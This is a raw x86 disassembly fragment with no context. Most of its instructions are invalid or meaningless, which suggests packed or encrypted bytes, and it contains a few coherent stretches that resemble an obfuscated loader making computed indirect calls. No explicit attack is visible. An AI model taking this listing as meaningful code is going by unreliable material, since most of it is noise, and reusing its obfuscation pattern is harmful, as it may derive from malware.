  40cb03:	mov    ah,0x37
  40cb05:	js     0x40cad4
  40cb07:	hlt    
  40cb08:	aam    0xbf
  40cb0a:	ja     0x40caab
  40cb0c:	aad    0x68
  40cb0e:	mov    al,0xfa
  40cb10:	inc    eax
  40cb11:	push   edi
  40cb12:	out    0xa0,eax
  40cb14:	add    eax,0xcb86f68d
  40cb19:	ins    DWORD PTR es:[edi],dx
  40cb1a:	jbe    0x40cb52
  40cb1c:	and    DWORD PTR [ecx-0x34],edx
  40cb1f:	dec    edx
  40cb20:	inc    esp
  40cb21:	mov    ebx,0xd550cf92
  40cb26:	xlat   BYTE PTR ds:[ebx]
  40cb27:	jae    0x40cac9
  40cb29:	push   eax
  40cb2a:	and    al,0x4c
  40cb2c:	loopne 0x40cb05
  40cb2e:	push   es
  40cb2f:	retf   0x320e
  40cb32:	jge    0x40cb1b
  40cb34:	push   edx
  40cb35:	dec    edx
  40cb36:	repz mov esi,0x1af78937
  40cb3c:	push   edx
  40cb3d:	inc    ebp
  40cb3e:	push   edx
  40cb3f:	mov    cl,0xc6
  40cb41:	mov    eax,ds:0x9086ed8f
  40cb46:	fs loope 0x40cb40
  40cb49:	mov    esi,0xff5b4b9
  40cb4e:	sbb    dh,BYTE PTR [ebx+0x58]
  40cb51:	xchg   ebp,eax
  40cb52:	sbb    eax,0x2a06ab0e
  40cb57:	jne    0x40cbc6
  40cb59:	fs pusha 
  40cb5b:	push   eax
  40cb5c:	push   ecx
  40cb5d:	mov    esp,0xc61f6a2f
  40cb62:	loope  0x40cb86
  40cb64:	test   al,0xe8
  40cb66:	jbe    0x40cb84
  40cb68:	outs   dx,BYTE PTR cs:[esi]
  40cb6a:	in     al,dx
  40cb6b:	outs   dx,BYTE PTR ds:[esi]
  40cb6c:	fs and ecx,0x420fdeac
  40cb73:	pushf  
  40cb74:	scas   eax,DWORD PTR es:[edi]
  40cb75:	cmp    BYTE PTR [eax-0x40],0x64
  40cb79:	leave  
  40cb7a:	gs pop esi
  40cb7c:	push   esi
  40cb7d:	into   
  40cb7e:	mul    DWORD PTR [esi+0x5a]
  40cb81:	jl     0x40cbd6
  40cb83:	ins    BYTE PTR es:[edi],dx
  40cb84:	pop    ebx
  40cb85:	sub    DWORD PTR [ecx+0x7b],esp
  40cb88:	fild   WORD PTR [ebx]
  40cb8a:	js     0x40cb61
  40cb8c:	mov    al,0xe7
  40cb8e:	retf   
  40cb8f:	jecxz  0x40cbe3
  40cb91:	xlat   BYTE PTR ds:[ebx]
  40cb92:	jle    0x40cc09
  40cb94:	inc    eax
  40cb95:	jp     0x40cb9a
  40cb97:	(bad)  
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8-0x28]
  40cbfc:	(bad)  
  40cbfd:	(bad)  
  40cbfe:	mov    ds:0x7e7e8c62,al
  40cc03:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40cc07:	out    0x9b,al
  40cc09:	sub    cl,bh
  40cc0b:	test   DWORD PTR [ebx],0x23785df0
  40cc11:	arpl   WORD PTR [ebp-0x28],ax
  40cc14:	dec    esi
  40cc15:	sbb    DWORD PTR [ebp+0x8],esi
  40cc18:	mov    esi,0xd1ab7057
  40cc1d:	and    eax,DWORD PTR [edi+0x20dc6022]
  40cc23:	je     0x40cbd7
  40cc25:	jp     0x40cc10
  40cc27:	inc    ebx
  40cc28:	mov    esp,0x4b157ca7
  40cc2d:	adc    eax,0xd68e9de2
  40cc32:	jle    0x40cc65
  40cc34:	mov    WORD PTR [ebx+0x7e],?
  40cc37:	jge    0x40cc55
  40cc39:	test   DWORD PTR [ebp-0x4c],esp
  40cc3c:	xchg   esi,eax
  40cc3d:	sbb    ah,ah
  40cc3f:	int3   
  40cc40:	ss jo  0x40cc24
  40cc43:	xchg   DWORD PTR [edx+0x39c601cd],ecx
  40cc49:	fcom   DWORD PTR [eax-0x259583d7]
  40cc4f:	and    al,0x25
  40cc51:	(bad)  
  40cc52:	jmp    0x2eed:0xa4746e30
  40cc59:	lea    edi,[edx-0x40696659]
  40cc5f:	and    al,0xf9
  40cc61:	inc    ebp
  40cc62:	dec    ecx
  40cc63:	iret   
  40cc64:	inc    ebx
  40cc65:	adc    DWORD PTR [ebx+0x6c],eax
  40cc68:	and    eax,0x28412b68
  40cc6d:	pop    esi
  40cc6e:	outs   dx,DWORD PTR ds:[esi]
  40cc6f:	add    eax,0xb11892c1
  40cc74:	retf   0xc015
  40cc77:	push   0xffffff8e
  40cc79:	fdiv   DWORD PTR [ebx]
  40cc7b:	jecxz  0x40cc3f
  40cc7d:	ins    DWORD PTR es:[edi],dx
  40cc7e:	jo     0x40ccb1
  40cc80:	(bad)  
  40cc81:	stc    
  40cc82:	pop    ebp
  40cc83:	cmp    eax,0x304c9045
  40cc88:	int3   
  40cc89:	dec    bx
  40cc8b:	and    DWORD PTR ss:[edi],eax
  40cc8e:	into   
  40cc8f:	jo     0x40cca6
  40cc91:	sub    bl,BYTE PTR [edi+ebx*1-0xe4da6f1]
  40cc98:	cmp    BYTE PTR [ebx+0x65],0x16
  40cc9c:	dec    ebp
  40cc9d:	jecxz  0x40cc9e
  40cc9f:	sbb    BYTE PTR ds:0x9d32d5b6,al
  40cca5:	xor    eax,0x1b5d65b9
  40ccaa:	add    DWORD PTR ds:0xe1406f91,edx
  40ccb0:	sbb    eax,0x89d44e86
  40ccb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccb6:	cmp    al,0xa1
  40ccb8:	push   cs
  40ccb9:	popf   
  40ccba:	add    eax,0xdc7de90
  40ccbf:	ret    
  40ccc0:	scas   al,BYTE PTR es:[edi]
  40ccc1:	outs   dx,DWORD PTR ds:[esi]
  40ccc2:	or     bh,BYTE PTR [ecx]
  40ccc4:	mov    ds:0xa13cc9d3,eax
  40ccc9:	fucom  st(1)
  40cccb:	test   al,0x56
  40cccd:	mov    al,ds:0x3a5c4fe
  40ccd2:	xor    BYTE PTR [edx-0x56],ch
  40ccd5:	in     al,dx
  40ccd6:	sbb    eax,ebp
  40ccd8:	je     0x40ccc7
  40ccda:	in     al,dx
  40ccdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccdc:	adc    dl,cl
  40ccde:	mov    bh,0xc6
  40cce0:	cmp    ecx,DWORD PTR [edx-0x301781d5]
  40cce6:	pusha  
  40cce7:	and    BYTE PTR [bp+si+0x4a],ch
  40cceb:	jle    0x40cc84
  40cced:	pop    edx
  40ccee:	pop    es
  40ccef:	or     dl,BYTE PTR [ecx]
  40ccf1:	neg    edx
  40ccf3:	test   DWORD PTR [edx+ebp*2-0x2027e11e],esi
  40ccfa:	pop    esp
  40ccfb:	out    dx,eax
  40ccfc:	fcomp  DWORD PTR [esi+0x12]
  40ccff:	jno    0x40cd57
  40cd01:	mov    dh,0xa6
  40cd03:	and    al,BYTE PTR [eax]
  40cd05:	add    eax,0x692b476e
  40cd0a:	pusha  
  40cd0b:	xchg   esp,eax
  40cd0c:	jno    0x40cd25
  40cd0e:	retf   
  40cd0f:	ret    
  40cd10:	cmp    BYTE PTR ds:0x8958ae5f,bl
  40cd16:	pusha  
  40cd17:	stos   DWORD PTR es:[edi],eax
  40cd18:	fild   WORD PTR [esi+0x21]
  40cd1b:	daa    
  40cd1c:	cdq    
  40cd1d:	sbb    ch,BYTE PTR [eax*8-0xfe02a9f]
  40cd24:	push   es
  40cd25:	sbb    BYTE PTR [esi-0x20],cl
  40cd28:	cs ins DWORD PTR es:[edi],dx
  40cd2a:	or     ah,BYTE PTR [eax+0x52bd3fa]
  40cd30:	fs cmp al,0x1f
  40cd33:	mov    ebp,gs
  40cd35:	add    bl,ch
  40cd37:	test   DWORD PTR [eax-0x65926094],0x7eab7176
  40cd41:	shl    BYTE PTR [eax],1
  40cd43:	cmc    
  40cd44:	ret    0x20a5
  40cd47:	rol    DWORD PTR [ebx],1
  40cd49:	push   0xd
  40cd4b:	pop    ds
  40cd4c:	addr16 jb 0x40cdb1
  40cd4f:	or     BYTE PTR [eax-0x1498d539],bl
  40cd55:	sbb    eax,0xe0711ae1
  40cd5a:	pop    ds
  40cd5b:	ins    DWORD PTR es:[edi],dx
  40cd5c:	fld    DWORD PTR [ebp+0x39cc6e0a]
  40cd62:	inc    edx
  40cd63:	sti    
  40cd64:	mov    cl,0xda
  40cd66:	adc    BYTE PTR [esi+0x46e0835d],ch
  40cd6c:	out    dx,eax
  40cd6d:	daa    
  40cd6e:	xchg   ebx,eax
  40cd6f:	mov    es,WORD PTR ds:0x6ae2a9
  40cd75:	rcr    BYTE PTR [ecx+ecx*2-0x4d73fa0a],1
  40cd7c:	out    dx,eax
  40cd7d:	push   ds
  40cd7e:	aam    0xe3
  40cd80:	in     eax,0xb9
  40cd82:	(bad)  
  40cd83:	lds    esi,FWORD PTR [ecx-0x4b]
  40cd86:	aas    
  40cd87:	or     bl,BYTE PTR gs:[edx+0x32]
  40cd8b:	ds ja  0x40cddf
  40cd8e:	loope  0x40cd32
  40cd90:	repnz add DWORD PTR [edx-0xb],eax
  40cd94:	jbe    0x40cd7f
  40cd96:	loope  0x40cd5c
  40cd98:	sbb    al,0xde
  40cd9a:	adc    eax,0x621bfa6f
  40cd9f:	xlat   BYTE PTR ds:[ebx]
  40cda0:	int    0x1a
  40cda2:	das    
  40cda3:	adc    DWORD PTR [edi],edi
  40cda5:	dec    edx
  40cda6:	cdq    
  40cda7:	add    eax,0x63c28ec0
  40cdac:	out    0xaa,eax
  40cdae:	shl    DWORD PTR [edi+esi*2-0x32],1
  40cdb2:	sar    dl,1
  40cdb4:	div    DWORD PTR [edx-0x21]
  40cdb7:	xchg   BYTE PTR [ebx-0x62],dl
  40cdba:	add    BYTE PTR [ebx-0x2],dh
  40cdbd:	test   al,0xf
  40cdbf:	xchg   esi,eax
  40cdc0:	and    BYTE PTR [ebx],bl
  40cdc2:	hlt    
  40cdc3:	pushf  
  40cdc4:	adc    DWORD PTR [esi-0x6e],ebp
  40cdc7:	jg     0x40ce44
  40cdc9:	dec    esi
  40cdca:	std    
  40cdcb:	dec    ebx
  40cdcc:	sbb    al,0x48
  40cdce:	mov    dh,dh
  40cdd0:	test   DWORD PTR [edi+eax*1],edx
  40cdd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdd4:	or     al,0x9d
  40cdd6:	out    dx,al
  40cdd7:	call   FWORD PTR [edx]
  40cdd9:	aam    0x71
  40cddb:	aad    0xf5
  40cddd:	jmp    DWORD PTR [ecx]
  40cddf:	and    eax,ebx
  40cde1:	mov    ebp,0x62d2c4fc
  40cde6:	and    ebp,DWORD PTR [ebx]
  40cde8:	mov    ds:0xd06c0650,eax
  40cded:	(bad)  
  40cdee:	icebp  
  40cdef:	(bad)
  40cdf3:	aaa    
  40cdf4:	mov    eax,ds:0x6f524555
  40cdf9:	sahf   
  40cdfa:	jb     0x40cdf6
  40cdfc:	sbb    edi,esi
  40cdfe:	stos   BYTE PTR es:[edi],al
  40cdff:	sub    eax,0xbceb2517
  40ce04:	shl    ebx,cl
  40ce06:	or     eax,0xe779fd7f
  40ce0b:	outs   dx,BYTE PTR ds:[esi]
  40ce0c:	pop    ecx
  40ce0d:	xchg   esi,eax
  40ce0e:	adc    edi,ecx
  40ce10:	sbb    DWORD PTR [edi],ecx
  40ce12:	pushf  
  40ce13:	ja     0x40cded
  40ce15:	adc    ch,BYTE PTR [ebp-0x4ef477f5]
  40ce1b:	ror    BYTE PTR ds:0x5ec93479,1
  40ce21:	adc    al,0x43
  40ce23:	mov    edx,0xefbedfdd
  40ce28:	and    BYTE PTR [ebx+0x1],dl
  40ce2b:	push   edx
  40ce2c:	mov    ecx,0x9e85b337
  40ce31:	dec    eax
  40ce32:	pushw  ds
  40ce34:	shl    BYTE PTR [ecx-0x67],cl
  40ce37:	loope  0x40ce1b
  40ce39:	xchg   esp,eax
  40ce3a:	mov    dl,0xef
  40ce3c:	dec    edx
  40ce3d:	or     ch,cl
  40ce3f:	int    0x8a
  40ce41:	jl     0x40ce50
  40ce43:	bound  esi,QWORD PTR [ecx+esi*2+0x8]
  40ce47:	inc    ebp
  40ce48:	adc    DWORD PTR [ebx],ebp
  40ce4a:	mov    bl,0xd
  40ce4c:	inc    ebx
  40ce4d:	sub    ebx,ecx
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	test   DWORD PTR [ebx],0x8b2c9ed5
  40ce68:	jle    0x40cee8
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	test   al,0xe3
  40ce70:	xor    DWORD PTR [ebx+0x4cc637e],edi
  40ce76:	stos   BYTE PTR es:[edi],al
  40ce77:	lods   al,BYTE PTR ds:[esi]
  40ce78:	jne    0x40ce39
  40ce7a:	shr    DWORD PTR [esi-0x7],1
  40ce7d:	nop
  40ce7e:	pushf  
  40ce7f:	push   es
  40ce80:	adc    DWORD PTR gs:[esi-0x1af5794c],0x7159ca9b
  40ce8b:	pop    edx
  40ce8c:	adc    al,0xdf
  40ce8e:	or     eax,0x8f6d3b29
  40ce93:	inc    ebp
  40ce94:	jmp    0xa535b41f
  40ce99:	mov    edi,eax
  40ce9b:	(bad)  
  40ce9c:	xor    al,0xfb
  40ce9e:	loopne 0x40cf1b
  40cea0:	in     eax,0xbd
  40cea2:	mov    ebx,0x6f780cd4
  40cea7:	mov    ebx,0xf8827799
  40ceac:	jbe    0x40cef1
  40ceae:	inc    esp
  40ceaf:	retf   
  40ceb0:	repz (bad) 
  40ceb2:	and    ah,BYTE PTR [ecx]
  40ceb4:	xchg   esp,eax
  40ceb5:	add    DWORD PTR [ebx],ebp
  40ceb7:	or     bl,BYTE PTR [edx]
  40ceb9:	sub    ch,cl
  40cebb:	shl    dl,0x21
  40cebe:	das    
  40cebf:	loopne 0x40ce4c
  40cec1:	xor    dh,0x5d
  40cec4:	push   esi
  40cec5:	int3   
  40cec6:	sub    al,0xbe
  40cec8:	adc    eax,0xe8212de3
  40cecd:	and    eax,0x458da722
  40ced2:	add    BYTE PTR [esi],0xbf
  40ced5:	rol    al,0x4b
  40ced8:	push   0xffffffb2
  40ceda:	dec    ebx
  40cedb:	cld    
  40cedc:	xchg   ebp,eax
  40cedd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cede:	je     0x40ce74
  40cee0:	xor    DWORD PTR [eax],esi
  40cee2:	sub    eax,0xf231f1de
  40cee7:	test   ebp,ebp
  40cee9:	call   FWORD PTR [ecx-0x3d]
  40ceec:	sahf   
  40ceed:	mov    eax,ds:0x5f005ea4
  40cef2:	mov    dh,0xb7
  40cef4:	jns    0x40ced4
  40cef6:	call   0x59c6:0xf2eea342
  40cefd:	sti    
  40cefe:	mov    ebx,0xf3e7fdfa
  40cf03:	sbb    edi,DWORD PTR [ecx]
  40cf05:	pop    esi
  40cf06:	push   edx
  40cf07:	and    ecx,ecx
  40cf09:	call   0x182b1ca3
  40cf0e:	loope  0x40cf1d
  40cf10:	les    edi,FWORD PTR [ebx]
  40cf12:	push   es
  40cf13:	and    al,0xf4
  40cf15:	xor    DWORD PTR [edx-0x6adc94ed],edi
  40cf1b:	pop    ecx
  40cf1c:	retf   
  40cf1d:	mov    ss,esp
  40cf1f:	pop    edi
  40cf20:	fisttp WORD PTR [ebx+0x7facef0f]
  40cf26:	or     DWORD PTR [edx-0x22895595],ebp
  40cf2c:	(bad)  
  40cf2d:	fld    QWORD PTR [edx+ebp*1]
  40cf30:	(bad)  
  40cf31:	mov    eax,DWORD PTR [edi-0xd]
  40cf34:	(bad)  
  40cf35:	sub    al,0xe1
  40cf37:	ins    DWORD PTR es:[edi],dx
  40cf38:	mov    al,0xa3
  40cf3a:	in     al,0x9c
  40cf3c:	out    dx,eax
  40cf3d:	fnstenv [edi-0x31]
  40cf40:	mov    DWORD PTR ds:0x19c79afc,edi
  40cf46:	mov    ds:0xe1bf9187,eax
  40cf4c:	cmc    
  40cf4d:	arpl   WORD PTR [ebx+esi*1],di
  40cf50:	xor    BYTE PTR [ecx],0x1b
  40cf53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf54:	dec    esi
  40cf55:	sub    dh,BYTE PTR [esi-0x7]
  40cf58:	mov    BYTE PTR [edx-0x304e8305],cl
  40cf5e:	add    eax,0xdaa9c820
  40cf63:	sti    
  40cf64:	jae    0x40cf5d
  40cf66:	and    BYTE PTR [ebx+edi*8+0x41],0x18
  40cf6b:	dec    eax
  40cf6c:	(bad)
  40cf70:	cpuid  
  40cf72:	mov    cl,0xb1
  40cf74:	push   ebx
  40cf75:	jno    0x40cf40
  40cf77:	jne    0x40cfec
  40cf79:	aad    0x10
  40cf7b:	rcr    ch,1
  40cf7d:	(bad)
  40cf81:	mov    ah,0x86
  40cf83:	es jl  0x40cf49
  40cf86:	mul    DWORD PTR [ebx-0x1a9efabd]
  40cf8c:	push   cs
  40cf8d:	mov    dh,0x49
  40cf8f:	jmp    0x40cf9e
  40cf91:	out    dx,eax
  40cf92:	jno    0x40cfd2
  40cf94:	imul   BYTE PTR [edi-0xc]
  40cf97:	and    BYTE PTR [edx+0x27624665],ch
  40cf9d:	mov    bl,0x23
  40cf9f:	fidivr DWORD PTR [esi-0x318a68cb]
  40cfa5:	push   esi
  40cfa6:	es cmp al,dh
  40cfa9:	xlat   BYTE PTR ds:[ebx]
  40cfaa:	cwde   
  40cfab:	jno    0x40cfe2
  40cfad:	adc    al,BYTE PTR [edx+0x44bbc2c9]
  40cfb3:	ficom  WORD PTR [edx+0x63]
  40cfb6:	dec    esi
  40cfb7:	test   BYTE PTR [edi+0x2996182e],0x84
  40cfbe:	pop    ecx
  40cfbf:	adc    cl,BYTE PTR [ebp-0x32ca47e1]
  40cfc5:	push   ecx
  40cfc6:	or     DWORD PTR [edx+ecx*8-0x70924940],ebx
  40cfcd:	mov    WORD PTR [edi-0x67910233],?
  40cfd3:	inc    edx
  40cfd4:	push   ecx
  40cfd5:	sbb    eax,0x2b9c7103
  40cfda:	add    al,0xa2
  40cfdc:	cld    
  40cfdd:	and    DWORD PTR [esi],edx
  40cfdf:	(bad)  
  40cfe0:	and    DWORD PTR [esi+0x5f204dbe],ebx
  40cfe6:	mov    esi,0x24bbc9e9
  40cfeb:	and    ebx,DWORD PTR [ebx]
  40cfed:	mov    dh,0x2f
  40cfef:	daa    
  40cff0:	jnp    0x40d049
  40cff2:	les    edi,FWORD PTR [ebp+0x8]
  40cff5:	xor    DWORD PTR [edi+0x46acb313],esp
  40cffb:	jbe    0x40d005
  40cffd:	add    al,cl
  40cfff:	add    DWORD PTR [ecx+0x13],eax
  40d002:	jae    0x40cf9f
  40d004:	inc    ebp
  40d005:	bound  esp,QWORD PTR [ecx]
  40d007:	xor    eax,0xc5085951
  40d00c:	outs   dx,BYTE PTR ds:[esi]
  40d00d:	inc    ebx
  40d00e:	dec    edi
  40d00f:	or     BYTE PTR [ebp-0x2],dl
  40d012:	cmp    dl,al
  40d014:	jbe    0x40d065
  40d016:	pop    ecx
  40d017:	jnp    0x40cfd2
  40d019:	xchg   BYTE PTR [eax+eax*1],bl
  40d01c:	sbb    BYTE PTR [ecx+0x7c7bc084],dh
  40d022:	pop    esp
  40d023:	jns    0x40cfd2
  40d025:	pop    es
  40d026:	or     eax,0xe66829ff
  40d02b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d02c:	ins    BYTE PTR es:[edi],dx
  40d02d:	add    eax,0x169389a6
  40d032:	scas   al,BYTE PTR es:[edi]
  40d033:	mov    cl,0x1d
  40d035:	xchg   ebp,eax
  40d036:	rcr    DWORD PTR [edi-0x50],cl
  40d039:	push   ss
  40d03a:	adc    al,0x99
  40d03c:	data16 aad 0x22
  40d03f:	adc    eax,0x575c46f2
  40d044:	jmp    0x40d045
  40d046:	mov    cl,0x11
  40d048:	jecxz  0x40d0c6
  40d04a:	cs lods eax,DWORD PTR ss:[esi]
  40d04d:	lods   eax,DWORD PTR ds:[esi]
  40d04e:	add    eax,0x2de2e125
  40d053:	xlat   BYTE PTR ds:[ebx]
  40d054:	test   al,0x4b
  40d056:	je     0x40d0bd
  40d058:	(bad)  
  40d059:	fisttp QWORD PTR [ebp-0x1d7f6299]
  40d05f:	adc    al,BYTE PTR [ebp-0x50]
  40d062:	(bad)  [eax]
  40d064:	sub    edx,DWORD PTR [ecx-0x73]
  40d067:	mov    al,ds:0xebf4501
  40d06c:	popa   
  40d06d:	and    eax,0x3b38d425
  40d072:	daa    
  40d073:	jne    0x40d0ad
  40d075:	fwait
  40d076:	mov    cl,0x8f
  40d078:	je     0x40d034
  40d07a:	cmp    ebx,DWORD PTR [edx+0x59]
  40d07d:	sbb    eax,0xece967f6
  40d082:	scas   eax,DWORD PTR es:[edi]
  40d083:	inc    edx
  40d084:	mov    bh,0x12
  40d086:	sbb    eax,0xe7cdd3e8
  40d08b:	imul   ecx,DWORD PTR [edi-0x17edd0d6],0x2f953064
  40d095:	or     BYTE PTR [eax],ah
  40d097:	mov    bl,BYTE PTR [ebx]
  40d099:	pop    DWORD PTR [ebx-0x49d6f34d]
  40d09f:	fidiv  WORD PTR [edx+0x74888b41]
  40d0a5:	fwait
  40d0a6:	push   ds
  40d0a7:	add    dh,BYTE PTR [ebp-0xb]
  40d0aa:	pusha  
  40d0ab:	out    dx,eax
  40d0ac:	repnz repz mov al,cs:0x95741fc4
  40d0b4:	dec    ecx
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	out    dx,eax
  40d0d0:	outs   dx,BYTE PTR ds:[esi]
  40d0d1:	xchg   ecx,eax
  40d0d2:	fdivr  st(6),st
  40d0d4:	mov    DWORD PTR [esi+0x7e],edi
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	mov    es,WORD PTR [edi-0x51d30718]
  40d0e1:	sbb    edx,DWORD PTR [edx]
  40d0e3:	mov    bl,0xdf
  40d0e5:	fstp   TBYTE PTR [eax]
  40d0e7:	mov    dh,0x5a
  40d0e9:	out    0x95,al
  40d0eb:	mov    ah,0x5d
  40d0ed:	fimul  DWORD PTR [ecx+edx*8+0x5ab76e98]
  40d0f4:	ficomp WORD PTR [edx-0x6528a914]
  40d0fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0fb:	adc    al,0xe8
  40d0fd:	in     al,dx
  40d0fe:	ror    BYTE PTR [eax-0x71],0x2f
  40d102:	sub    al,0xaf
  40d104:	pusha  
  40d105:	daa    
  40d106:	cmp    al,0xce
  40d108:	adc    al,0x31
  40d10a:	sbb    esp,esp
  40d10c:	ffree  st(1)
  40d10e:	out    dx,al
  40d10f:	sbb    eax,DWORD PTR [ecx*4+0x58acbd1f]
  40d116:	fcomi  st,st(7)
  40d118:	sub    cl,BYTE PTR [edi-0x20]
  40d11b:	test   ecx,ebx
  40d11d:	or     DWORD PTR [edx],ebp
  40d11f:	test   DWORD PTR [eax],esi
  40d121:	sbb    al,0x89
  40d123:	inc    esi
  40d124:	push   DWORD PTR [ebx-0x52]
  40d127:	icebp  
  40d128:	adc    ah,dl
  40d12a:	shl    ecx,cl
  40d12c:	xchg   edi,eax
  40d12d:	inc    esp
  40d12e:	dec    eax
  40d12f:	leave  
  40d130:	pop    esi
  40d131:	add    al,0xe0
  40d133:	jne    0x40d133
  40d135:	cli    
  40d136:	imul   esp,eax,0x12
  40d139:	or     eax,0x53d42b5a
  40d13e:	(bad)  
  40d13f:	sub    BYTE PTR [esi],bl
  40d141:	shr    DWORD PTR [edi+ebx*1-0x24a76b04],1
  40d148:	ret    
  40d149:	(bad)  
  40d14a:	cmovl  edx,DWORD PTR [ecx-0x66]
  40d14e:	loopne 0x40d1a3
  40d150:	out    dx,eax
  40d151:	jmp    0xcce4a50d
  40d156:	adc    DWORD PTR [ecx-0x7f],eax
  40d159:	(bad)  
  40d15a:	fwait
  40d15b:	or     eax,0x1d8d5d9d
  40d160:	adc    bh,ah
  40d162:	mov    ebx,0x2ebb7b45
  40d167:	(bad)  
  40d168:	mov    cl,0x48
  40d16a:	sub    al,0xf7
  40d16c:	stc    
  40d16d:	adc    eax,0x3ece92be
  40d172:	push   ds
  40d173:	or     ch,BYTE PTR [edi+0x15]
  40d176:	or     ah,bh
  40d178:	cld    
  40d179:	shl    BYTE PTR [ebx],1
  40d17b:	cmova  eax,DWORD PTR [ebp+0x6fbe8209]
  40d182:	data16 mov ds:0xba17034e,al
  40d188:	aaa    
  40d189:	mov    cl,0xbd
  40d18b:	jp     0x40d17f
  40d18d:	std    
  40d18e:	push   0xffffffbd
  40d190:	and    eax,0x337c533b
  40d195:	mov    al,ds:0xcc648a95
  40d19a:	sbb    ecx,ebx
  40d19c:	cli    
  40d19d:	and    BYTE PTR [esi],bh
  40d19f:	adc    cl,bh
  40d1a1:	out    dx,al
  40d1a2:	xchg   esi,eax
  40d1a3:	jl     0x40d1fe
  40d1a5:	jns    0x40d1fa
  40d1a7:	mov    BYTE PTR [ecx],dl
  40d1a9:	jo     0x40d1ae
  40d1ab:	adc    DWORD PTR [eax+0x27771c30],0x48
  40d1b2:	xchg   BYTE PTR [esi],dh
  40d1b4:	cld    
  40d1b5:	sbb    BYTE PTR [edi+edi*4+0x29a9bc45],ah
  40d1bc:	out    dx,al
  40d1bd:	sub    al,0x83
  40d1bf:	adc    edx,DWORD PTR [edi]
  40d1c1:	xor    BYTE PTR [edx],dh
  40d1c3:	mov    edi,0x5b2297dc
  40d1c8:	mov    eax,ds:0xc2a4feeb
  40d1cd:	sti    
  40d1ce:	push   0x257675d3
  40d1d3:	or     bh,BYTE PTR [ebx]
  40d1d5:	lods   al,BYTE PTR ds:[esi]
  40d1d6:	xor    bl,BYTE PTR [esi-0x2e7ae92d]
  40d1dc:	push   ecx
  40d1dd:	ins    BYTE PTR es:[edi],dx
  40d1de:	enter  0xa2e6,0x83
  40d1e2:	sbb    cl,BYTE PTR ds:0x7bf0a0cf
  40d1e8:	push   esp
  40d1e9:	add    BYTE PTR [esi+edi*1],bh
  40d1ec:	inc    esi
  40d1ed:	(bad)  
  40d1ee:	cmp    ebp,ebp
  40d1f0:	add    BYTE PTR [ebx+0x44],ah
  40d1f3:	scas   al,BYTE PTR es:[di]
  40d1f5:	shld   DWORD PTR [edi-0x2a],ebx,cl
  40d1f9:	pushf  
  40d1fa:	lock push edi
  40d1fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1fd:	push   es
  40d1fe:	ret    0xad9e
  40d201:	jnp    0x40d20c
  40d203:	call   0xbf8d922a
  40d208:	pusha  
  40d209:	sub    ebx,ebx
  40d20b:	and    ah,bh
  40d20d:	mov    edx,0xf3692f55
  40d212:	pusha  
  40d213:	daa    
  40d214:	dec    edx
  40d215:	out    0x13,al
  40d217:	add    BYTE PTR [ebx-0x6fa6d35a],al
  40d21d:	mov    ds:0x9091741a,al
  40d222:	pop    edx
  40d223:	in     eax,0xed
  40d225:	shr    DWORD PTR [ebx+0x71d69ed1],1
  40d22b:	sbb    eax,esp
  40d22d:	lea    ecx,[esi+eax*4+0x71]
  40d231:	fsub   QWORD PTR ds:0xca95da81
  40d237:	push   eax
  40d238:	jo     0x40d2b1
  40d23a:	cmp    DWORD PTR [esi-0x6e52d80f],ebp
  40d240:	int3   
  40d241:	xchg   edi,eax
  40d242:	call   0xdb18584a
  40d247:	sub    DWORD PTR [edi-0x1e],edi
  40d24a:	and    al,0x6f
  40d24c:	xor    BYTE PTR [esi+0x54],ah
  40d24f:	test   ecx,0xe60bc5a0
  40d255:	sbb    ah,BYTE PTR [esi+0x5455b029]
  40d25b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d25c:	cwde   
  40d25d:	jnp    0x40d28a
  40d25f:	scas   al,BYTE PTR es:[edi]
  40d260:	arpl   WORD PTR [ebx+0x54c6f657],si
